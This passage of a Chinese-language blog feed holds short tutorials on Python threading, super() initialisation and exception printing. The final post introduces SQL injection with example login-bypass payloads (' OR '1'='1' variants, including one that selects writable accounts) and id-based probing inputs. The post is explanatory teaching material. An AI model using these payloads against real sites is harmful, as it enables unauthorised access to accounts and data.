&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;========================&lt;/span&gt; RESTART &lt;span style=&#34;color:#f92672&#34;&gt;================================&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; 
I was listening to 爱情买卖! Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:48:59 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
I was listening to 爱情买卖! Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:49:00 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
I was at the 阿凡达! Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:49:01 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
I was at the 阿凡达! Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:49:06 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
all over Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:49:11 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2多线程&#34;&gt;2.多线程&lt;/h2&gt;
&lt;p&gt;在多线程中，我们同时执行多个任务！&lt;code&gt;Python&lt;/code&gt;中可以使用&lt;code&gt;threading&lt;/code&gt; 来实现多线程，示例代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#coding=utf-8&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; time &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ctime,sleep

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;music&lt;/span&gt;(func):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I was listening to &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;func&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;! &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;move&lt;/span&gt;(func):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I was at the &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;func&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;! &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
    threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;music, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;爱情买卖&amp;#39;&lt;/span&gt;,))
    threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(t1)
    t2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;move, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;阿凡达&amp;#39;&lt;/span&gt;,))
    threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(t2)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads:
        t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setDaemon(&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
        t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;all over &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;music, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;爱情买卖&amp;#39;&lt;/span&gt;,))
threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(t1)

&lt;span style=&#34;color:#75715e&#34;&gt;# 创建了 threads 数组，创建线程 t1,使用 threading.Thread() 方法，在这个方法中调用 music 方法 target=music，args 方法对 music 进行传参。把创建好的线程 t1 装到 threads 数组中。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads:
    t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setDaemon(&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;span style=&#34;color:#75715e&#34;&gt;# 最后通过 for 循环遍历数组。（数组被装载了t1和t2两个线程）&lt;/span&gt;
setDaemon()
&lt;span style=&#34;color:#75715e&#34;&gt;# setDaemon(True) 将线程声明为守护线程，必须在 start() 方法调用之前设置，如果不设置为守护线程程序会被无限挂起。子线程启动后，父线程也继续执行下去，当父线程执行完最后一条语句后，没有等待子线程，直接就退出了，同时子线程也一同结束&lt;/span&gt;
start()
&lt;span style=&#34;color:#75715e&#34;&gt;# 开始线程活动&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;=========================&lt;/span&gt; RESTART &lt;span style=&#34;color:#f92672&#34;&gt;================================&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; 
I was listening to 爱情买卖. Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 12:51:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt; 
I was at the 阿凡达! Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 12:51:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
all over Thu Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 12:51:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从执行结果来看，子线程和主线程都是同一时间启动，但由于主线程执行完结束，所以导致子线程也终止。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads:
        t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setDaemon(&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
        t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads:
        t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()

    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;all over &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ctime()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 我们只对上面的程序加了个 join() 方法，用于等待线程终止。join() 的作用是，在子线程完成运行之前，这个子线程的父线程将一直被阻塞。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 注意: join() 方法的位置是在 for 循环外的，也就是说必须等待 for 循环里的两个进程都结束后，才去执行主进程。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—子类的 super 初始化</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%AD%90%E7%B1%BB%E7%9A%84-super-%E5%88%9D%E5%A7%8B%E5%8C%96/</link>
        <pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%AD%90%E7%B1%BB%E7%9A%84-super-%E5%88%9D%E5%A7%8B%E5%8C%96/</guid>
        <description>&lt;h2 id=&#34;1使用场景&#34;&gt;1.使用场景&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mywindow&lt;/span&gt;(QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QMainWindow, Ui_MainWindow):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self):
        super(mywindow, self)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setupUi(self)
&lt;span style=&#34;color:#75715e&#34;&gt;# 寻找 mywindow 的父类 QtWidgets.QMainWindow 中的 __init__()，进行对 mywindow 的初始化&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2解析&#34;&gt;2.解析&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# python 中的 super(Net, self).__init__() 其执行时&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 首先找到 Net 的父类（比如是类 NNet），然后把类 Net 的对象 self 转换为类 NNet 的对象，然后被转换的类 NNet 对象调用自己的 init 函数&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是对继承自父类的属性进行初始化，使用父类的初始化方法来初始化继承的属性。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—异常信息打印</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%89%93%E5%8D%B0/</link>
        <pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%89%93%E5%8D%B0/</guid>
        <description>&lt;h2 id=&#34;1-直接打印错误&#34;&gt;1. 直接打印错误&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# noinspection PyBroadException (pycharm 警告注释)&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quit&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; ex:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;出现如下异常&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ex)
&lt;span style=&#34;color:#75715e&#34;&gt;#---------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
    print(e)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-用traceback模块打印&#34;&gt;2. 用traceback模块打印&lt;/h2&gt;
&lt;p&gt;上述方式看不到具体错误的信息，如行数，不便于调试的时候定位，因此可以使用traceback模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; traceback
&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
    traceback&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;print_exc()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Traceback (most recent call last):
 File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:\Users\Administrator\Desktop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;est1.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;module&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;ZeroDivisionError&lt;/span&gt;: division by zero
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果如同出错时在命令行中报错一样打印信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;traceback.print_exc() 是直接打印错误&lt;/li&gt;
&lt;li&gt;traceback.format_exc() 则返回字符串&lt;/li&gt;
&lt;li&gt;即 traceback.print_exc() === print ( traceback.format_exc())&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 SQL 漏洞</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;p&gt;要了解sql漏洞，首先要搞清楚sql语句。sql 全称 Structured Query Language(结构化查询语言)，是一种应用于数据库查询的编程语言。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;admin&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这一句就是从admin表中查找 user为test 并且 pass为123456 的记录，并将满足要求的记录输出。但是如果我输入的密码是 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1 ，用户名是 test ，那么sql语句则变为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;admin&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很明显，WHERE后的表达式一定返回true，于是mysql会将每条记录都输出，而网站误以为这个用户名是正确的，然后让你以test的身份登录。如果网站还设有管理权限，那么你可以试试密码为 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; AND writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;，这样，sql查询语句就是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;admin&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; writable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中 user = &amp;ldquo;test&amp;rdquo; AND pass = &amp;quot;&amp;rdquo; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; 始终返回true，所以实际条件为 writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;&amp;quot;，即writable = TRUE，于是mysql会将writable为true的记录输出。&lt;/p&gt;
&lt;p&gt;还有一种是通过GET参数id来查询的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; articles &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果网站没有对id进行校验，那么不妨用 id=1 AND 1=1  // id=1 AND 1=2 // id=&amp;rdquo; 来测试，对应结果为正确，正确，错误，即该接口可以被注入&lt;/p&gt;
